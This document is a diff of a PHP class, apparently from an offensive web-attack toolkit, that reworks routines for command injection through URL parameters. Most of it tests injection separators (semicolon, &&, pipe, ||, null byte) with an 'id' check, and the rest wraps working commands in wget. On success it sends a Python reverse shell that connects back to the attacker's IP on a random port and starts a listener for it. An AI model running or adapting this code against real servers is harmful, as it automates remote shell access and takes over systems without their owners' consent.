@@ -53,35 +53,58 @@ class PARAM4COM extends URL{
         $this->param2rce($user_agent,$template,$cmd,$filter);
     }
     
-    
-    public function param2rce($user_agent,$template,$cmd,$filter){ // OK
+    public function param2rce($template_wget){ // OK
         $this->ssTitre(__FUNCTION__);
-        $shell = "/bin/bash";
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
+                
+        if(!empty($template_wget)){
+            
+            $wget_cmd = str_replace("%CMD%","id", $template_wget);
+            $rst_id = $this->param2check($wget_cmd,"| grep 'uid=' ");
+            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
+            if (!empty($uid_name)) {
+
+                $shell = "/bin/bash";
+                $attacker_ip = $this->ip4addr4target($this->ip);
+                $attacker_port = rand(1024,65535);
+                $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
+                
+                $template_shell = str_replace("%CMD%", "%SHELL%", $template_wget) ;
+                $cmd_rev_nc = addcslashes($cmd_rev_nc, '"');
+                $template_exec = str_replace("%CMD%",$cmd_rev_nc, $template_wget) ;
+                
+                $templateB64_shell = base64_encode($template_shell);
+                $this->port2shell($templateB64_shell);
+                
+                $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
+            }
+            $this->pause();
+        }
+    }
+    
+    public function param2rce2rm($user_agent,$template_wget,$cmd,$filter){ // OK
+        $this->ssTitre(__FUNCTION__);
+
         
-        if(!empty($template)){
-            $cmd_value = $this->param2url($template, $cmd);
-            $rst_id = $this->param2check($user_agent,$cmd_value,$filter);
+        if(!empty($template_wget)){
+            
+            $wget_cmd = str_replace("%CMD%", $cmd, $template_wget);
+            $rst_id = $this->param2check($wget_cmd,$filter);
+            
             if (!empty($rst_id)) {
                 
-                
+                $shell = "/bin/bash";
+                $attacker_ip = $this->ip4addr4target($this->ip);
+                $attacker_port = rand(1024,65535);
                 $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
-                $cmd_rev_nc = $this->url2encode($cmd_rev_nc);
-                $url = $this->param2url($template, $cmd_rev_nc);
                 
-                if ($this->methode_http=="GET") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" -qO-  ";
-                if ($this->methode_http=="POST") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" --data \"$this->param=$cmd_rev_nc\" -qO-  ";
-                
-                
-                $template_shell = str_replace("%CMD%", "%SHELL%", $template_rec);
+                $template_shell = str_replace("%CMD%", "%SHELL%", $template_wget) ;    
+                $cmd_rev_nc = addcslashes($cmd_rev_nc, '"');
+                $template_exec = str_replace("%CMD%",$cmd_rev_nc, $template_wget) ;
+
                 $templateB64_shell = base64_encode($template_shell);
-                $this->port2shell(base64_encode($template_rec));
-                
-                $template_exec = str_replace("%CMD%", $cmd_rev_nc, $template_rec);
+                $this->port2shell($templateB64_shell);
+
                 $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
-                
-                
             }
             $this->pause();
         }
@@ -103,67 +126,67 @@ class PARAM4COM extends URL{
         $cmd_exec = "$cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = "; $cmd";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%", $this->url);
+        $cmd_exec = "$cmd";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value; %CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = "; $cmd$this->null_byte";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%%NB%", $this->url);
+        $cmd_exec = "$cmd$this->null_byte";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value; %CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = " && $cmd";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%", $this->url);
+        $cmd_exec = "$cmd";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value && %CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = " && $cmd$this->null_byte";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%%NB%", $this->url);
+        $cmd_exec = "$cmd$this->null_byte";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value && %CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
         
-        $cmd_exec = " | $cmd";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%", $this->url);
+        $cmd_exec = "$cmd";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value | %CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = " | $cmd$this->null_byte";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%%NB%", $this->url);
+        $cmd_exec = "$cmd$this->null_byte";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value | %CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = " || $cmd";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%", $this->url);
+        $cmd_exec = " $cmd";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value || %CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
         
-        $cmd_exec = " || $cmd$this->null_byte";
-        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%%NB%", $this->url);
+        $cmd_exec = "$cmd$this->null_byte";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=$this->value || %CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
-        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
-            return $url_template;
+        if (!empty($this->param2check($this->url2wget($this->user2agent, "", $url, $this->methode_http),$filter))) {
+            return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
         }
-        return $url_template;
+        return $this->url2wget($this->user2agent, "", $url_template, $this->methode_http);
     }
     
     
@@ -179,17 +202,18 @@ class PARAM4COM extends URL{
         return $template;
     }
     
-    public function param2check($user2agent,$url,$filter){  
+    public function param2wget($user2agent,$header,$template,$cmd){  
         $this->ssTitre(__FUNCTION__);
+        $url = $this->param2url($template, $cmd);
         $this->article("Test URL",$url);
-         
-        if ($this->methode_http==="GET") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
-        if ($this->methode_http==="POST") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
-        //$query = "curl --silent --connect-timeout 10 --no-keepalive --retry 2 --user-agent '$user2agent' \"$url\"  $filter ";
-        return $this->req_ret_str($query);
+        return $this->url2wget($user2agent,$header,$url, $this->methode_http);       
     }
     
-
+    public function param2check($wget_cmd,$filter){
+        $this->ssTitre(__FUNCTION__);
+        $query = "$wget_cmd $filter";
+        return $this->req_ret_str($query);
+    }
     
     public function compare2string($string1,$string2){
         
